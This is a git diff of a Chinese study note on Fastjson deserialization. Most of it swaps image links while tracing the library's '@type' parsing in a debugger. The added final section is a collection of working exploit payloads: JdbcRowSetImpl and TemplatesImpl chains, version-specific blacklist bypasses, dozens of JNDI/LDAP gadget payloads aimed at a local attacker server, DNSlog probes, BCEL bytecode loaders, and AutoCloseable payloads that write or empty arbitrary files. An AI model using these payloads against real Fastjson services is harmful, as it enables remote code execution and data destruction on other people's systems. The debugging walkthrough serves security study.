@@ -120,15 +120,15 @@ System.out.println(jsonObject);
 
 #### 1.字符串解析
 
-![image-20241108210527527](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411082105614.png)
+![image-20241108210527527](assets/202411082105614.png)
 
 步入
 
-![image-20241108211104705](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411082111744.png)
+![image-20241108211104705](assets/202411082111744.png)
 
 我们可以先看看JSONObject是什么
 
-![image-20241108211133822](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411082111870.png)
+![image-20241108211133822](assets/202411082111870.png)
 
 我们可以看到它其实是一个Map，也就是键值对
 
@@ -138,57 +138,57 @@ System.out.println(jsonObject);
 
 步入`parse`
 
-![image-20241108211953221](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411082119265.png)
+![image-20241108211953221](assets/202411082119265.png)
 
 我们可以看到字符被传入`DefaultJSONParser`这个字符解析器里面，后面这个`fearures`参数可以指定一些解析时的要求，比如能不能用单引号，能不能用空格之类的
 
 步入这个prase
 
-![image-20241108212230310](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411082122347.png)
+![image-20241108212230310](assets/202411082122347.png)
 
 继续步入
 
-![image-20241108213141654](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411082131699.png)
+![image-20241108213141654](assets/202411082131699.png)
 
 我们可以看到这里运用switch-case结构对字符串进行挨个匹配
 
 这里的`LBRACE`指的是左大括号，所以我们步入就直接跳转到`case LBRACE:`了
 
-![image-20241108220148863](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411082201908.png)
+![image-20241108220148863](assets/202411082201908.png)
 
 可以看到此时object还是空的，也就是说还没把我们传入的字符转化为一个对象
 
 继续步入
 
-![image-20241108220443612](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411082204649.png)
+![image-20241108220443612](assets/202411082204649.png)
 
 在这个parseObject类里面，他会把我们传入的字符串转换为一个对象
 
 直接步入到try-char部分，前面的东西不是很重要（看不懂）
 
-![image-20241108220900531](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411082209575.png)
+![image-20241108220900531](assets/202411082209575.png)
 
 这是一个死循环，也就是说只能通过break，return之类的才能跳出循环
 
 这里会对字符串中的字符进行匹配，如
 
-![image-20241108221443796](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411082214831.png)
+![image-20241108221443796](assets/202411082214831.png)
 
 此时我们的第一位是'"'号，所以这里ch == '''的结果为false，而ch == '"'则结果为true
 
-![image-20241108221858003](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411082218051.png)
+![image-20241108221858003](assets/202411082218051.png)
 
 接下来会对key进行判断，我们这里的@type是属于第一类`DEFAULT_TYPE_KEY`
 
-![](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411082219150.png)
+![](assets/202411082219150.png)
 
 首先这里会用loadClass加载这个类`TypeUtils`，跟进去看看
 
-![image-20241108222345267](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411082223313.png)
+![image-20241108222345267](assets/202411082223313.png)
 
 这里会进行一些判断，比如传入的内容如果开头是'['则判定为数组
 
-![image-20241108222516304](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411082225352.png)
+![image-20241108222516304](assets/202411082225352.png)
 
 到最后就调用AppClassLoader来加载这个类，然后就返回`clazz`
 
@@ -198,33 +198,33 @@ System.out.println(jsonObject);
 
 接下来我们继续步入
 
-![image-20241108223313788](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411082233838.png)
+![image-20241108223313788](assets/202411082233838.png)
 
 这里调用了一个Java反序列化器，步入
 
-![image-20241108223704745](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411082237805.png)
+![image-20241108223704745](assets/202411082237805.png)
 
 这个构造方法里面构造了很多个系统的内置的类一一对应的构造器
 
 回到正题，继续步过，我们掉到一个方法里面
 
-![image-20241108224321147](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411082243198.png)
+![image-20241108224321147](assets/202411082243198.png)
 
 步入方法
 
-![image-20241108224352904](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411082243950.png)
+![image-20241108224352904](assets/202411082243950.png)
 
 有个获取注解的方法和一个黑名单方法（貌似用来限制性能？），没什么东西
 
 回到ParserConfig,我们继续步入
 
-![image-20241108224720955](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411082247008.png)
+![image-20241108224720955](assets/202411082247008.png)
 
 这里进行了一堆类型的判断，如果符合类型则实例化对应的类，由于都不是，所以执行else语句中的内容，按照这个JavaBeanDeserializer来进行解析
 
 步入JavaBeanDeserializer
 
-![image-20241108225124464](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411082251517.png)
+![image-20241108225124464](assets/202411082251517.png)
 
 
 
@@ -236,21 +236,21 @@ System.out.println(jsonObject);
 
 我们可以看到这里调用了一个叫JavaBeanInfo.build的函数，跟进去看看
 
-![image-20241108230312518](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411082303575.png)
+![image-20241108230312518](assets/202411082303575.png)
 
 这个类会在我们创建这个类对应的反序列化器的时候，要对我们的这个类里面的东西进行了解（我们这里是指constructor，setAge,setName之类的）
 
-![image-20241108230716651](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411082307707.png)
+![image-20241108230716651](assets/202411082307707.png)
 
 步进之后我们可以在这里面看到一个对我们的类里面的方法进行遍历的一个东西
 
-![image-20241108231056159](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411082310208.png)
+![image-20241108231056159](assets/202411082310208.png)
 
 直接看整体的代码逻辑
 
 可以看到其实他对Method进行了两次的遍历，第一遍是为了获取所有的set（里面对开头是否为set进行了判断），而第二遍是为了获取所有的get
 
-![image-20241108232406944](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411082324989.png)
+![image-20241108232406944](assets/202411082324989.png)
 
 等获取了所有的set方法之后，他会创建一个FieldInfo
 
@@ -260,23 +260,23 @@ System.out.println(jsonObject);
 
 对方法进行遍历结束之后,将我们获取到的方法传入这个`JavaBeanInfo`
 
-![image-20241108235501832](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411082355906.png)
+![image-20241108235501832](assets/202411082355906.png)
 
 里面没什么有用的东西，继续步进
 
-![image-20241109110558219](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411091105281.png)
+![image-20241109110558219](assets/202411091105281.png)
 
-![image-20241109110522868](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411091105937.png)
+![image-20241109110522868](assets/202411091105937.png)
 
 可以看到在这里的`benInfo`已经获取到了字段name和age，同时也获取到了这个字段对应的方法，如name对应的setName方法
 
-![image-20241109110752066](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411091107106.png)
+![image-20241109110752066](assets/202411091107106.png)
 
 这里没有get方法是因为已经获取到了set方法，所有不会再获取get方法，上面遍历的时候有说，而且反序列化是一个赋值的过程，所有要调用的是set方法，用来赋值
 
 继续步进
 
-![image-20241109111339350](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411091113429.png)
+![image-20241109111339350](assets/202411091113429.png)
 
 这里会进行一些判断，比如第一个这个判断fieldInfo的getOnly是否为true（这里是false），如果为true则使asmEnable为false，第二个会判断我们获取到的类是否为public类...
 
@@ -292,33 +292,33 @@ System.out.println(jsonObject);
 
 而假如开关开了的话则会从信进行JavaBeanInfo.build
 
-![image-20241109112355189](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411091123243.png)
+![image-20241109112355189](assets/202411091123243.png)
 
 详细的就不重新看了
 
 接着步进
 
-![image-20241109112546567](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411091125622.png)
+![image-20241109112546567](assets/202411091125622.png)
 
 这里会创建一个临时的JavaBeanDeserializer类，由于是一个临时的类导致我们很难继续调试（看不到源代码）
 
 那我们可以回到刚才判断getonly是否为true的地方，我们如果可以想办法把getonly变成true则可以调用系统自带的反序列化器，方便我们进行调试
 
-![image-20241109113123730](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411091131788.png)
+![image-20241109113123730](assets/202411091131788.png)
 
 那我们查找一下，看一下getOnly的值在哪里写入
 
-![image-20241109113351901](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411091133948.png)
+![image-20241109113351901](assets/202411091133948.png)
 
 跟进去
 
-![image-20241109113443184](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411091134229.png)
+![image-20241109113443184](assets/202411091134229.png)
 
 我们可以看到如果获取一个长度不为1的方法就可以使getOnly的值为true，那我们要怎么做呢？
 
 我们可以回去看看前面对set方法和get方法进行遍历的地方，我们可以发现在遍历获取set方法的时候，如果长度为一则会直接退出进行下一轮循环
 
-![image-20241109114017424](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411091140463.png)
+![image-20241109114017424](assets/202411091140463.png)
 
 所以想要让getOnly为true，set方法行不通。
 
@@ -336,11 +336,11 @@ public Map getMap() {
 
 那我们回到刚通过判断来选择不同的反序列化器的地方
 
-![image-20241109115658398](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411091156444.png)
+![image-20241109115658398](assets/202411091156444.png)
 
 由于map的getOnly是true，所以把开关关掉了
 
-![image-20241109115751908](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411091157957.png)
+![image-20241109115751908](assets/202411091157957.png)
 
 成功进入到这一步，我们可以继续进行调试了
 
@@ -348,17 +348,17 @@ public Map getMap() {
 
 接着步进
 
-![image-20241109204408378](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411092044463.png)
+![image-20241109204408378](assets/202411092044463.png)
 
 我看看现在的derializer
 
-![image-20241109204457694](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411092044742.png)
+![image-20241109204457694](assets/202411092044742.png)
 
 我们可以看到现在已经获取到三个对象
 
 接下来就要调用反序列化方法了
 
-![image-20241109204721865](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411092047921.png)
+![image-20241109204721865](assets/202411092047921.png)
 
 我们前面所有工作就是为了拿到这个反序列化器
 
@@ -366,21 +366,21 @@ public Map getMap() {
 
 在JavaBeanDeserializer里面，他会遍历刚刚我们获取到的三个字段
 
-![image-20241109205340156](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411092053206.png)
+![image-20241109205340156](assets/202411092053206.png)
 
 然后中间会进行一些实例化之类的操作（？）（不知道在干嘛
 
 最后会调用setValue进行一些赋值操作
 
-![image-20241109205739166](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411092057215.png)
+![image-20241109205739166](assets/202411092057215.png)
 
 跟进去看看，可以看到在最后这里用了一个invoke方法给age进行了赋值
 
-![image-20241109205943667](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411092059712.png)
+![image-20241109205943667](assets/202411092059712.png)
 
 赋值完我们就可以看到控制台输出了setAge
 
-![image-20241109210053277](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411092100324.png)
+![image-20241109210053277](assets/202411092100324.png)
 
 接下来应该是对name进行赋值，与前面对age进行赋值的步骤一样，赋值后控制台输出setName
 
@@ -388,35 +388,35 @@ public Map getMap() {
 
 那我们前面看到get方法是在哪被调用了呢（输出getName，getAge..）
 
-![image-20241109211824788](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411092118836.png)
+![image-20241109211824788](assets/202411092118836.png)
 
 其实是通过这个toJSON方法
 
 在这个toJSON方法里面他会通过遍历获取所有的field（name，age，map）
 
-![image-20241109212427373](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411092124426.png)
+![image-20241109212427373](assets/202411092124426.png)
 
 获取完之后我们看看这个fieldInfoList，后面写着size=3，也就是已经获取到了三个字段（name，age，map）
 
-![image-20241109212510240](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411092125286.png)
+![image-20241109212510240](assets/202411092125286.png)
 
-![image-20241109212717609](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411092127654.png)
+![image-20241109212717609](assets/202411092127654.png)
 
 值都获取到了，接下来该进行调用了，当我们步进到这里时
 
-![image-20241109212846928](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411092128982.png)
+![image-20241109212846928](assets/202411092128982.png)
 
 这里调用了一个getFieldValuesMap方法，进去看看
 
-![image-20241109213351039](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411092133087.png)
+![image-20241109213351039](assets/202411092133087.png)
 
 我们可以发现这个循环会调用get方法，那我们进去看看这个getPropertyValue方法，看看他怎么调用的
 
-![image-20241109213714655](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411092137709.png)
+![image-20241109213714655](assets/202411092137709.png)
 
 可以发现在这一行之后会输出getAge，那我们再步入
 
-![image-20241109213806538](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411092138586.png)
+![image-20241109213806538](assets/202411092138586.png)
 
 可以看到这里调用了invoke方法，执行后输出getAge，那我们就知道为什么会调用get方法了，接下来的map和name的get方法调用也是一样的，就不叙述了
 
@@ -426,7 +426,7 @@ public Map getMap() {
 
 回归刚刚我们写的代码
 
-![image-20241109214319202](https://pico-1258249479.cos.ap-guangzhou.myqcloud.com/202411092143248.png)
+![image-20241109214319202](assets/202411092143248.png)
 
 我们可以知道当使用`@type:`的时候fastjson在对他进行反序列化解析的时候会构造对应的方法，所以我们可以看到输出constructor
 
@@ -474,7 +474,7 @@ public class Test {
 
 #### **JdbcRowSetImpl 反序列化**(<=1.2.24)：
 
-##### 攻击流程：
+攻击流程：
 
 1. 首先是这个lookup(URI)参数可控
 2. 攻击者控制URI参数为指定为恶意的一个RMI服务
@@ -482,19 +482,483 @@ public class Test {
 4. 目标在进行`lookup()`操作时，会动态加载并实例化Factory类，接着调用`factory.getObjectInstance()`获取外部远程对象实例；
 5. 攻击者可以在Factory类文件的静态代码块处写入恶意代码，达到RCE的效果；
 
-##### payload：
+payload：
 
 ```java
 {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:23457/Command8","autoCommit":true}
 ```
 
+
+
 #### **TemplatesImpl 反序列化(<=1.2.24)：**
 
+payload:
+
+```java
+{
+    "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+    "_bytecodes": ["yv66vgAAADQA...CJAAk="],
+    "_name": "su18",
+    "_tfactory": {},
+    "_outputProperties": {},
+}
+```
 
 
 
+#### ParserConfig (1.2.25 <= fastjson <= 1.2.41):
+
+payload:
+
+```java
+{
+    "@type":"Lcom.sun.rowset.JdbcRowSetImpl;",
+    "dataSourceName":"ldap://127.0.0.1:23457/Command8",
+    "autoCommit":true
+}
+```
 
 
 
+#### ParserConfig2 (fastjson-1.2.42)
+
+payload:
+
+```java
+{
+    "@type":"LLcom.sun.rowset.JdbcRowSetImpl;;",
+    "dataSourceName":"ldap://127.0.0.1:23457/Command8",
+    "autoCommit":true
+}
+```
 
 
+
+#### JndiDataSourceFactory(1.2.25 <= fastjson <= 1.2.32)
+
+payload:
+
+```java
+{
+    "@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
+    "properties":{
+        "data_source":"ldap://127.0.0.1:23457/Command8"
+    }
+}
+```
+
+
+
+#### 未开启 AutoTypeSupport(1.2.25 <= fastjson <= 1.2.32)：
+
+```java
+{
+    "su18": {
+        "@type": "java.lang.Class",
+        "val": "com.sun.rowset.JdbcRowSetImpl"
+    },
+    "su19": {
+        "@type": "com.sun.rowset.JdbcRowSetImpl",
+        "dataSourceName": "ldap://127.0.0.1:23457/Command8",
+        "autoCommit": true
+    }
+}
+```
+
+
+
+### payload合集
+
+https://www.javasec.org/java-vuls/FastJson.html#%E5%9B%9B%E3%80%81payload
+
+以下为部分在各个途径搜集的 payload，版本自测：
+
+JdbcRowSetImpl
+
+```json
+{
+    "@type": "com.sun.rowset.JdbcRowSetImpl",
+    "dataSourceName": "ldap://127.0.0.1:23457/Command8",
+    "autoCommit": true
+}
+```
+
+TemplatesImpl
+
+```json
+{
+    "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+    "_bytecodes": ["yv66vgA...k="],
+    '_name': 'su18',
+    '_tfactory': {},
+    "_outputProperties": {},
+}
+```
+
+JndiDataSourceFactory
+
+```json
+{
+    "@type": "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
+    "properties": {
+      "data_source": "ldap://127.0.0.1:23457/Command8"
+    }
+}
+```
+
+SimpleJndiBeanFactory
+
+```json
+{
+    "@type": "org.springframework.beans.factory.config.PropertyPathFactoryBean",
+    "targetBeanName": "ldap://127.0.0.1:23457/Command8",
+    "propertyPath": "su18",
+    "beanFactory": {
+      "@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
+      "shareableResources": [
+        "ldap://127.0.0.1:23457/Command8"
+      ]
+    }
+}
+```
+
+DefaultBeanFactoryPointcutAdvisor
+
+```json
+{
+  "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor",
+   "beanFactory": {
+     "@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
+     "shareableResources": [
+       "ldap://127.0.0.1:23457/Command8"
+     ]
+   },
+   "adviceBeanName": "ldap://127.0.0.1:23457/Command8"
+},
+{
+   "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor"
+}
+```
+
+WrapperConnectionPoolDataSource
+
+```json
+{
+    "@type": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
+    "userOverridesAsString": "HexAsciiSerializedMap:aced000...6f;"
+  }
+```
+
+JndiRefForwardingDataSource
+
+```json
+{
+    "@type": "com.mchange.v2.c3p0.JndiRefForwardingDataSource",
+    "jndiName": "ldap://127.0.0.1:23457/Command8",
+    "loginTimeout": 0
+  }
+```
+
+InetAddress
+
+```json
+{
+    "@type": "java.net.InetAddress",
+    "val": "http://dnslog.com"
+}
+```
+
+Inet6Address
+
+```json
+{
+    "@type": "java.net.Inet6Address",
+    "val": "http://dnslog.com"
+}
+```
+
+URL
+
+```json
+{
+    "@type": "java.net.URL",
+    "val": "http://dnslog.com"
+}
+```
+
+JSONObject
+
+```json
+{
+    "@type": "com.alibaba.fastjson.JSONObject",
+    {
+        "@type": "java.net.URL",
+        "val": "http://dnslog.com"
+    }
+}
+""
+}
+```
+
+URLReader
+
+```json
+{
+    "poc": {
+        "@type": "java.lang.AutoCloseable",
+        "@type": "com.alibaba.fastjson.JSONReader",
+        "reader": {
+            "@type": "jdk.nashorn.api.scripting.URLReader",
+            "url": "http://127.0.0.1:9999"
+        }
+    }
+}
+```
+
+AutoCloseable 任意文件写入
+
+```json
+{
+    "@type": "java.lang.AutoCloseable",
+    "@type": "org.apache.commons.compress.compressors.gzip.GzipCompressorOutputStream",
+    "out": {
+        "@type": "java.io.FileOutputStream",
+        "file": "/path/to/target"
+    },
+    "parameters": {
+        "@type": "org.apache.commons.compress.compressors.gzip.GzipParameters",
+        "filename": "filecontent"
+    }
+}
+```
+
+BasicDataSource
+
+```json
+{
+  "@type" : "org.apache.tomcat.dbcp.dbcp.BasicDataSource",
+  "driverClassName" : "$$BCEL$$$l$8b$I$A$A$A$A...",
+  "driverClassLoader" :
+  {
+    "@type":"Lcom.sun.org.apache.bcel.internal.util.ClassLoader;"
+  }
+}
+```
+
+JndiConverter
+
+```json
+{
+    "@type": "org.apache.xbean.propertyeditor.JndiConverter",
+    "AsText": "ldap://127.0.0.1:23457/Command8"
+}
+```
+
+JtaTransactionConfig
+
+```json
+{
+    "@type": "com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig",
+    "properties": {
+        "@type": "java.util.Properties",
+        "UserTransaction": "ldap://127.0.0.1:23457/Command8"
+    }
+}
+```
+
+JndiObjectFactory
+
+```json
+{
+    "@type": "org.apache.shiro.jndi.JndiObjectFactory",
+    "resourceName": "ldap://127.0.0.1:23457/Command8"
+}
+```
+
+AnterosDBCPConfig
+
+```json
+{
+    "@type": "br.com.anteros.dbcp.AnterosDBCPConfig",
+    "metricRegistry": "ldap://127.0.0.1:23457/Command8"
+}
+```
+
+AnterosDBCPConfig2
+
+```json
+{
+    "@type": "br.com.anteros.dbcp.AnterosDBCPConfig",
+    "healthCheckRegistry": "ldap://127.0.0.1:23457/Command8"
+}
+```
+
+CacheJndiTmLookup
+
+```json
+{
+    "@type": "org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup",
+    "jndiNames": "ldap://127.0.0.1:23457/Command8"
+}
+```
+
+AutoCloseable 清空指定文件
+
+```json
+{
+    "@type":"java.lang.AutoCloseable",
+    "@type":"java.io.FileOutputStream",
+    "file":"/tmp/nonexist",
+    "append":false
+}
+```
+
+AutoCloseable 清空指定文件
+
+```json
+{
+    "@type":"java.lang.AutoCloseable",
+    "@type":"java.io.FileWriter",
+    "file":"/tmp/nonexist",
+    "append":false
+}
+```
+
+AutoCloseable 任意文件写入
+
+```json
+{
+    "stream":
+    {
+        "@type":"java.lang.AutoCloseable",
+        "@type":"java.io.FileOutputStream",
+        "file":"/tmp/nonexist",
+        "append":false
+    },
+    "writer":
+    {
+        "@type":"java.lang.AutoCloseable",
+        "@type":"org.apache.solr.common.util.FastOutputStream",
+        "tempBuffer":"SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=",
+        "sink":
+        {
+            "$ref":"$.stream"
+        },
+        "start":38
+    },
+    "close":
+    {
+        "@type":"java.lang.AutoCloseable",
+        "@type":"org.iq80.snappy.SnappyOutputStream",
+        "out":
+        {
+            "$ref":"$.writer"
+        }
+    }
+}
+```
+
+BasicDataSource
+
+```json
+{
+        "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
+        "driverClassName": "true",
+        "driverClassLoader": {
+            "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
+        },
+        "driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A...o$V$A$A"
+    }
+```
+
+HikariConfig
+
+```json
+{
+    "@type": "com.zaxxer.hikari.HikariConfig",
+    "metricRegistry": "ldap://127.0.0.1:23457/Command8"
+}
+```
+
+HikariConfig
+
+```json
+{
+    "@type": "com.zaxxer.hikari.HikariConfig",
+    "healthCheckRegistry": "ldap://127.0.0.1:23457/Command8"
+}
+```
+
+HikariConfig
+
+```json
+{
+    "@type": "org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig",
+    "metricRegistry": "ldap://127.0.0.1:23457/Command8"
+}
+```
+
+HikariConfig
+
+```json
+{
+    "@type": "org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig",
+    "healthCheckRegistry": "ldap://127.0.0.1:23457/Command8"
+}
+```
+
+SessionBeanProvider
+
+```json
+{
+    "@type": "org.apache.commons.proxy.provider.remoting.SessionBeanProvider",
+    "jndiName": "ldap://127.0.0.1:23457/Command8",
+    "Object": "su18"
+}
+```
+
+JMSContentInterceptor
+
+```json
+{
+    "@type": "org.apache.cocoon.components.slide.impl.JMSContentInterceptor",
+    "parameters": {
+        "@type": "java.util.Hashtable",
+        "java.naming.factory.initial": "com.sun.jndi.rmi.registry.RegistryContextFactory",
+        "topic-factory": "ldap://127.0.0.1:23457/Command8"
+    },
+    "namespace": ""
+}
+```
+
+ContextClassLoaderSwitcher
+
+```json
+{
+    "@type": "org.jboss.util.loading.ContextClassLoaderSwitcher",
+    "contextClassLoader": {
+        "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
+    },
+    "a": {
+        "@type": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$...$A$A"
+    }
+}
+```
+
+OracleManagedConnectionFactory
+
+```json
+{
+    "@type": "oracle.jdbc.connector.OracleManagedConnectionFactory",
+    "xaDataSourceName": "ldap://127.0.0.1:23457/Command8"
+}
+```
+
+JNDIConfiguration
+
+```json
+{
+    "@type": "org.apache.commons.configuration.JNDIConfiguration",
+    "prefix": "ldap://127.0.0.1:23457/Command8"
+}
+```
